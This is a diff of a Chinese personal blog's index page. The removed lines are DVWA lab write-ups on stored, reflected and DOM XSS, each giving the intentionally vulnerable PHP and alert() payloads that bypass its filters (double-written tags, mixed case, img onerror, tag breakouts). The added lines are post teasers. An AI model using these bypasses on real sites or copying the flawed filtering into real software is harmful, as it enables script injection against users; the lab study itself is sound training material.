@@ -132,47 +132,30 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-DVWA/分类详解/XSS/XSS(Stored)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-DVWA" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(Stored)/">DVWA/分类详解/XSS/XSS(Stored)</a>
+      <a class="article-title" href="/2020/01/04/DVWA/">DVWA</a>
     </h1>
   
 
         
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(Stored)/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.830Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
+        <a href="/2020/01/04/DVWA/" class="archive-article-date">
+  	<time datetime="2020-01-03T16:03:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize message input</span><br><span class="line">    $message &#x3D; stripslashes( $message );</span><br><span class="line">    $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize name input</span><br><span class="line">    $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update database</span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>长度有限制，但可以抓包修改</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(2)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize message input</span><br><span class="line">    $message &#x3D; strip_tags( addslashes( $message ) );</span><br><span class="line">    $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message &#x3D; htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize name input</span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );</span><br><span class="line">    $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update database</span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>只是单纯的过滤了<script>,可以通过双写和大小写绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;Script&gt;alert(2)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize message input</span><br><span class="line">    $message &#x3D; strip_tags( addslashes( $message ) );</span><br><span class="line">    $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message &#x3D; htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize name input</span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $name );</span><br><span class="line">    $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update database</span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>正则过滤<script>，多少个都没有用，但是可以通过其他标签进行注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize message input</span><br><span class="line">    $message &#x3D; stripslashes( $message );</span><br><span class="line">    $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message &#x3D; htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitize name input</span><br><span class="line">    $name &#x3D; stripslashes( $name );</span><br><span class="line">    $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $name &#x3D; htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update database</span><br><span class="line">    $data &#x3D; $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );</span><br><span class="line">    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>对特殊符号进行了html转义，基本无法进行注入</p>
-</script></p>
+        <p>今天发一下硬盘格式化抢救回来的对于DVWA靶场的渗透记录，基本是可以作为web安全入门的参考资料了，大家一起分享~</p>
+        
+          <a class="article-more-a" href="/2020/01/04/DVWA/#more">more >></a>
+        
       
       
     
@@ -183,11 +166,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(Stored)/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/01/04/DVWA/">展开全文 >></a>
         </p>
       
 
@@ -219,45 +213,30 @@
 
 
   
-    <article id="post-DVWA/分类详解/XSS/XSS(Reflected)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-makedown基本语法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(Reflected)/">DVWA/分类详解/XSS/XSS(Reflected)</a>
+      <a class="article-title" href="/2020/01/03/makedown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">makedown基本语法</a>
     </h1>
   
 
         
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(Reflected)/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.802Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
+        <a href="/2020/01/03/makedown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2020-01-02T16:11:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-03</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>对输入没有任何过滤，可以直接注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>meidum利用str_replace进行替换，但可以双写或者大小写绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>经过正则过滤，多少<script>都会被过滤掉，但可以利用标签属性来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Impossible使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为HTML，无法执行xss</p>
-</script></p>
+        <p>makedown用的会比较多，记一波最常用的makedown语法，随时补充~</p>
+        
+          <a class="article-more-a" href="/2020/01/03/makedown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#more">more >></a>
+        
       
       
     
@@ -268,11 +247,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(Reflected)/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/01/03/makedown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">展开全文 >></a>
         </p>
       
 
@@ -304,44 +294,30 @@
 
 
   
-    <article id="post-DVWA/分类详解/XSS/XSS(DOM)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-计组复习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(DOM)/">DVWA/分类详解/XSS/XSS(DOM)</a>
+      <a class="article-title" href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/">计组复习</a>
     </h1>
   
 
         
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(DOM)/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.781Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
+        <a href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/" class="archive-article-date">
+  	<time datetime="2020-01-02T13:07:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># No protections, anything goes</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>没有经过任何过滤，可以直接注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;</span><br><span class="line">    $default &#x3D; $_GET[&#39;default&#39;];</span><br><span class="line">    </span><br><span class="line">    # Do not allow script tags</span><br><span class="line">    if (stripos ($default, &quot;&lt;script&quot;) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">        header (&quot;location: ?default&#x3D;English&quot;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?</span><br></pre></td></tr></table></figure>
-
-<p>过滤了<script>,但我们可以借助其他标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D; &gt;&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    # White list the allowable languages</span><br><span class="line">    switch ($_GET[&#39;default&#39;]) &#123;</span><br><span class="line">        case &quot;French&quot;:</span><br><span class="line">        case &quot;English&quot;:</span><br><span class="line">        case &quot;German&quot;:</span><br><span class="line">        case &quot;Spanish&quot;:</span><br><span class="line">            # ok</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            header (&quot;location: ?default&#x3D;English&quot;);</span><br><span class="line">            exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>只能从三种语言选一种，暂时不太好注入</p>
